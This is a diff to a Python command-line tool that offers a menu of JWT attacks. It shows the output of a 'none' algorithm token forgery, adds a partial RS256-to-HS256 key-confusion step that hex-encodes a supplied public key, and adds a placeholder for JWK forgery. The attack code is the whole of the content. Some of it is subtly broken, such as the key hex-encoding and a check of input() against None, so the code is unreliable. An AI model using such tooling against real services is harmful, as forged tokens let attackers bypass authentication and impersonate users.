@@ -1,7 +1,8 @@
 import base64
 import json
+import sys
 
-jwt_ = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU5MjYwMTMxOSwiZXhwIjoxNTkyNjAxNDM5LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.TFMvzHZ4s4Qa-YVlIIV0Pjw0eK4N0BFczzS6uoTWS_0"
+jwt_sample = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU5MjYwMTMxOSwiZXhwIjoxNTkyNjAxNDM5LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.TFMvzHZ4s4Qa-YVlIIV0Pjw0eK4N0BFczzS6uoTWS_0"
 
 def decode_b64(data):
     missing_padding = 4 - len(data) % 4
@@ -38,6 +39,20 @@ def none_alg(jwt):
     
     print('Returned JWT: ', encoded_header + '.' + encoded_payload + '.')
 
+def rs256_to_hs256(jwt, pub_key_file):
+    hex_key = ""
+    with open(pub_key_file, 'r') as f:
+        while True:
+            char = f.read(1)
+            if not char:
+                break
+            hex_key += hex(ord(char))
+        f.close()
+    print('Hex key: ', hex_key)
+
+def jwk_forge(jwt):
+    print('Not implemented yet')
+
 def main():
     print('-----Select JWT exploit option-----')
     print('(1) "none" exploit')
@@ -50,9 +65,15 @@ def main():
     if choice == '1':
         none_alg(jwt)
     elif choice == '2':
-        print('Not implemented yet')
+        pub_key_file = input('Please enter your public key file (e.g. key.pem): ')
+        if pub_key_file is None:
+            print('Invalid public key')
+            sys.exit()
+        rs256_to_hs256(jwt, pub_key_file)
     elif choice == '3':
-        print('Not implemented yet')
+        jwk_forge(jwt)
+    else:
+        print('Please enter a valid option')
 
 if __name__ == "__main__":
     main()
